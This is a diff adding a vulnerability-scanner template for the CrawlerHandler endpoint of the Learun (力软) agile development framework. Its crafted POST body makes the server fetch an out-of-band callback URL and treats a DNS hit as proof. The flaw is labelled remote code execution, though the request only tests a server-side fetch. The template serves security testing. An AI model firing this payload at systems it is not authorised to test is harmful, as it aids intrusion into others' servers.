@@ -1,0 +1,40 @@
+id: learun-adf-crawlerhandler-rce
+info:
+  name: 力软敏捷开发框架 CrawlerHandler 远程代码执行漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce,dnslog
+  description: |
+    力软敏捷开发框架 CrawlerHandler endpoint is vulnerable to remote code execution
+    by sending a malicious payload via POST.
+
+variables:
+  reverse: '{{interactsh-url}}'
+
+http:
+  - method: POST
+    path:
+      - "/Utility/CrawlerHandler"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "source[]=http://{{reverse}}"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "远程服务器返回错误"
+          - "data"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
